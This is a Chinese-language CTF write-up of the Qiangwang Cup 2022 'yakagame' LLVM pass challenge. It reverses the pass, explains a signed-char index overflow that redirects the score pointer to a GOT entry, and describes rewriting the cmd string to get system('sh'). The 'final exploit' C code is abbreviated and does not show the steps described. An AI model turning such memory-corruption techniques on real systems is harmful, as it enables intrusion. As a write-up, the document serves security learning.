# LLVM PASS PWN (三)

这是关于LLVM PASS PWN的第三篇文章，本文将记录学习强网杯2022 yakagame这道题的过程。

## 逆向分析

下载后发现了三个文件：`opt-8`, `readme.md`, 和 `yaka.so`。首先阅读`readme.md`：
```bash
you can upload your exp code and when you think your exp code is good, just attack it
```bash
opt-8 -load ./yaka.so -ayaka ./exp.ll
```
```

和CISCN 2021 satool一样，给出了运行格式。接下来对`yaka.so`进行逆向分析。与之前的方法相同，直接查找重写`runOnFunction`函数的位置，在虚函数表（vtable）的最后找到该函数。

### 调试过程

通过调试发现，PASS会对`gamestart`这个函数进行优化。初始的`exp.c`如下：
```c
#include <stdio.h>
int gamestart() {
    return 0;
}
```
程序成功运行，但很快退出了。原因是测试程序直接返回0。因此，我们继续查看其他功能处理部分。

### 功能函数

找到了一个`fight`处理函数，并注意到有一个地方调用了`backdoor`函数，但需要`score`大于`0x12345678`。验证代码如下：
```c
#include <stdio.h>
void fight(int a) {}
void gamestart() {
    fight(1);
}
```
验证后确认是这样的。接着，`ZExtValue`实际上是`weaponlist`的索引，会从`weapon_list`中取出对应索引的值并与`boss`进行比较。如果大于等于`boss`则赢得游戏并获得分数；否则失败。最后，如果分数大于`0x12345678`则进入`backdoor`。

#### 其他功能函数
- `merge`：有两个参数，取出两个参数并找到对应的`weaponlist`的值然后相加。
- `destroy`：有一个参数，取出参数并将对应的`weaponlist`的值改为0。
- `upgrade`：有一个参数，然后`weaponlist`里面的每个值都加上一参。

这些函数对`cmd`进行了异或、加、减操作，`cmd`是`backdoor`里面`system`的参数，但显示为乱码。这意味着我们可以使用这些函数构造出想要的内容并跳转执行`bk`。

如果函数名不是上述提到的那些，则会被存入`funMap`。例如，`z1r001`函数已经被存放到`funmap`中。对于已经存入`funmap`的函数名，只会占用原本应该占用的位置，并不会继续往下添加。需要注意的是，函数名不能乱，遍历的时候是按照函数名大小顺序进行的。

## 漏洞利用

经过逆向分析，漏洞点在于`v33`是有符号char类型的，范围是`-128 ~ +127`。如果`v33`为127时再加上1，那么`v33`不会是128而是-128，再加的时候则是-127。我们需要利用这个溢出来修改`score`，使其指向一个特别大的地址。

### 利用步骤
1. 生成128 * 2个从小到大的函数名，这样可以直接负数溢出完`score`的位置，并给里面的值都赋上0。
    ```python
    for i in range(128 * 2):
        print(f'void z1r0{str(i).zfill(3)}(int a){{}}')
    for i in range(128 * 2):
        print(f'z1r0{str(i).zfill(3)}(0);')
    ```
2. 计算`score`的位置。255是-1，所以240是-0x10。从240开始逐字节修改`score`。由于`opt-8`没有开启PIE，我们可以将`score`改为GOT表中的地址，使`score`指向的地址内容大于`0x12345678`。

3. 最后，我们需要解密`cmd`。但由于可以控制`cmd`，我们可以将其设置为`sh`的地址，直接使用`ropgadget`获取`sh`的地址，最终执行`system("sh")`。

### 最终Exploit代码
```c
#include <stdio.h>

void fight(int a) {}
void merge(int a, int b) {}
void destroy(int a) {}
void upgrade(int a) {}
void wuxiangdeyidao() {}
void zhanjinniuza() {}
void guobapenhuo() {}
void tiandongwanxiang() {}

// 生成128 * 2个函数
#define GEN_FUNC(n) void z1r0 ## n (int a) {}
GEN_FUNC(000)
GEN_FUNC(001)
...
GEN_FUNC(219)

int main() {
    // 调用生成的函数
    z1r0000(0);
    z1r0001(0);
    ...
    z1r0219(0);
    return 0;
}
```

通过这种方式，我们可以成功利用漏洞并执行任意命令。